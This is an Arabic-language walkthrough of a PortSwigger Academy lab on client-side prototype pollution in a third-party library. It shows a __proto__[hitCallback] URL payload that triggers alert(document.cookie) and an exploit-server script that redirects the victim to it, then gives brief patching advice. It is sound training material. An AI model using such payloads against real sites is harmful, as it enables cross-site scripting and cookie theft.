# [Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)

## **`الهدف`**
قم باستخدام `DOM Invader` لتحديد تلوث النموذج الأولي وأداة الـ `DOM XSS` ثم استخدم سيرفر الاستغلا لتوصيل `Payload` إلى الضحية بحيث يستدعي `alert(document.cookie)` في متصفحها. 
## **`خطوات الحل`**
**`ملاحظة هامة:`** هذا اللاب مبني على ثغرة حقيقة اكتشفتها الـ `PortSwigger`، ولمزيد من المعلومات انظر، **[Widespread prototype pollution gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)**

سنستعمل `DOM Invader` وبعد الضغط على `Exploit` في الخطوة الأخيرة، سنقوم بنسخ الاستغلال الخاص بالـ `DOM Invader` والذي هو رابط الصفحة الجديدة التي فُتحت تلقائيًا
```URL
https://0afe00f30423c15d80241cfb0079002c.web-security-academy.net/#__proto__[hitCallback]=alert%281%29
```
بعد ذلك سنقوم بتعديله `alert(document.cookie)`
```URL
https://0afe00f30423c15d80241cfb0079002c.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29
```

وبعد ذلك سنتوجه إلى سيرفر الاستغلال ونضع السكريبت التالي في خانة `Body`.
```html
<script>
    location="https://0afe00f30423c15d80241cfb0079002c.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
```
ثم نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [DOM XSS via client-side prototype pollution](./DOM-XSS-via-client-side-prototype-pollution.md)

ويجب دائمًا فحص وتحديث المكتبات الخارجية.
